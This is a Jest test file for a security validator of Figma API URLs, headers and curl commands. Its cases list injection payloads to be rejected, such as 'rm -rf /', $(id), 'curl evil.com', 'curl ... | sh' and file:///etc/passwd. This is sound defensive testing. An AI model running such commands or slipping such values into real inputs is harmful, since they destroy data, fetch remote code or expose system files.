import { validateUrl, validateHeaders, validateCurlCommand } from "../security-validation.js";

describe("Security Validation", () => {
  describe("validateUrl", () => {
    it("should accept valid Figma URLs", () => {
      const validUrls = [
        "https://api.figma.com/v1/files/abc123",
        "https://figma.com/file/abc123",
        "https://s3-alpha-sig.figma.com/img/abc123",
        "http://api.figma.com/v1/files/abc123", // Should be allowed (upgraded to HTTPS)
      ];

      validUrls.forEach((url) => {
        expect(() => validateUrl(url)).not.toThrow();
      });
    });

    it("should reject URLs with dangerous characters", () => {
      const dangerousUrls = [
        "https://api.figma.com/files/abc; rm -rf /",
        "https://api.figma.com/files/abc`whoami`",
        "https://api.figma.com/files/abc$(id)",
        "https://api.figma.com/files/abc|curl evil.com",
        "https://api.figma.com/files/abc&& curl evil.com",
        "https://api.figma.com/files/abc\\'malicious\\'",
        'https://api.figma.com/files/abc"malicious"',
      ];

      dangerousUrls.forEach((url) => {
        expect(() => validateUrl(url)).toThrow("URL contains potentially dangerous characters");
      });
    });

    it("should reject URLs from unauthorized domains", () => {
      const unauthorizedUrls = [
        "https://evil.com/malicious",
        "https://api.figma.evil.com/files/abc",
        "https://not-figma.com/files/abc",
        "https://subdomain.api.figma.com/files/abc", // Should be allowed
      ];

      expect(() => validateUrl("https://evil.com/malicious")).toThrow(
        "URL domain 'evil.com' is not in the allowed list",
      );
      expect(() => validateUrl("https://api.figma.evil.com/files/abc")).toThrow(
        "is not in the allowed list",
      );
      expect(() => validateUrl("https://not-figma.com/files/abc")).toThrow(
        "is not in the allowed list",
      );

      // This should be allowed
      expect(() => validateUrl("https://subdomain.api.figma.com/files/abc")).not.toThrow();
    });

    it("should reject non-HTTP protocols", () => {
      const invalidProtocols = [
        "ftp://api.figma.com/files/abc",
        "file:///etc/passwd",
        "javascript:alert(1)",
      ];

      invalidProtocols.forEach((url) => {
        expect(() => validateUrl(url)).toThrow("Only HTTP and HTTPS URLs are allowed");
      });
    });

    it("should reject URLs that are too long", () => {
      const longUrl = "https://api.figma.com/" + "a".repeat(3000);
      expect(() => validateUrl(longUrl)).toThrow("URL exceeds maximum length");
    });

    it("should reject invalid inputs", () => {
      expect(() => validateUrl("")).toThrow("URL must be a non-empty string");
      expect(() => validateUrl(null as any)).toThrow("URL must be a non-empty string");
      expect(() => validateUrl(123 as any)).toThrow("URL must be a non-empty string");
      expect(() => validateUrl("not-a-url")).toThrow("Invalid URL format");
    });
  });

  describe("validateHeaders", () => {
    it("should accept valid headers", () => {
      const validHeaders = {
        Authorization: "Bearer token123",
        "X-Figma-Token": "fig_token_123",
        "Content-Type": "application/json",
      };

      expect(() => validateHeaders(validHeaders)).not.toThrow();
      expect(() => validateHeaders(undefined)).not.toThrow();
    });

    it("should reject headers with dangerous characters in keys", () => {
      const dangerousKeys = [
        { "; rm -rf /": "value" },
        { "key`whoami`": "value" },
        { "key$(id)": "value" },
        { "key|curl evil.com": "value" },
        { "key\\'malicious\\'": "value" },
        { 'key"malicious"': "value" },
        { "key\\nmalicious": "value" },
      ];

      dangerousKeys.forEach((headers) => {
        expect(() => validateHeaders(headers as unknown as Record<string, string>)).toThrow(
          "Header key contains potentially dangerous characters",
        );
      });
    });

    it("should reject headers with dangerous characters in values", () => {
      const dangerousValues = [
        { Authorization: "Bearer `whoami`" },
        { Authorization: "Bearer $(id)" },
        { Authorization: "Bearer token\\nmalicious" },
        { Authorization: "Bearer token<script>" },
        { "Custom-Header": "value{dangerous}" },
      ];

      dangerousValues.forEach((headers) => {
        expect(() => validateHeaders(headers as unknown as Record<string, string>)).toThrow(
          "Header value contains potentially dangerous characters",
        );
      });
    });

    it("should reject headers with injection patterns", () => {
      // Command substitution patterns should be caught
      expect(() => validateHeaders({ Authorization: "Bearer token$(whoami)" })).toThrow(
        "Header value contains potentially dangerous characters",
      );
      expect(() => validateHeaders({ Authorization: "Bearer token${USER}" })).toThrow(
        "Header value contains potentially dangerous characters",
      );
      // Variable assignment patterns should be caught by injection pattern check
      expect(() => validateHeaders({ "Custom-Header": "value; test=dangerous" })).toThrow(
        "Header value contains potential injection pattern",
      );
    });

    it("should reject headers that are too long", () => {
      const longKey = "a".repeat(300);
      const longValue = "b".repeat(10000);

      expect(() => validateHeaders({ [longKey]: "value" })).toThrow(
        "Header key exceeds maximum length",
      );
      expect(() => validateHeaders({ key: longValue })).toThrow(
        "Header value exceeds maximum length",
      );
    });

    it("should reject invalid header inputs", () => {
      expect(() => validateHeaders({ "": "value" })).toThrow(
        "Header key must be a non-empty string",
      );
      expect(() => validateHeaders({ key: "" })).toThrow("Header value must be a non-empty string");
      expect(() => validateHeaders({ key: null as any })).toThrow(
        "Header value must be a non-empty string",
      );
    });
  });

  describe("validateCurlCommand", () => {
    it("should accept valid curl commands", () => {
      const validCommands = [
        "curl -s -S --fail-with-body -L https://api.figma.com/files/abc",
        "curl -s -S --fail-with-body -L -H Authorization:\\ Bearer\\ token https://api.figma.com/files/abc",
      ];

      validCommands.forEach((command) => {
        expect(() => validateCurlCommand(command)).not.toThrow();
      });
    });

    it("should reject commands that do not start with curl", () => {
      const invalidCommands = [
        "rm -rf /",
        "wget https://evil.com",
        'bash -c "curl https://api.figma.com"',
      ];

      invalidCommands.forEach((command) => {
        expect(() => validateCurlCommand(command)).toThrow("Command must start with curl");
      });
    });

    it("should reject commands with dangerous patterns", () => {
      const dangerousCommands = [
        "curl https://api.figma.com; rm -rf /",
        "curl https://api.figma.com | sh",
        "curl https://api.figma.com && wget evil.com",
        "curl https://api.figma.com || rm file",
        "curl https://api.figma.com `whoami`",
        "curl https://api.figma.com $(id)",
      ];

      dangerousCommands.forEach((command) => {
        expect(() => validateCurlCommand(command)).toThrow(
          "Curl command contains potentially dangerous patterns",
        );
      });
    });

    it("should reject invalid command inputs", () => {
      expect(() => validateCurlCommand("")).toThrow("Command must be a non-empty string");
      expect(() => validateCurlCommand(null as any)).toThrow("Command must be a non-empty string");
    });
  });
});
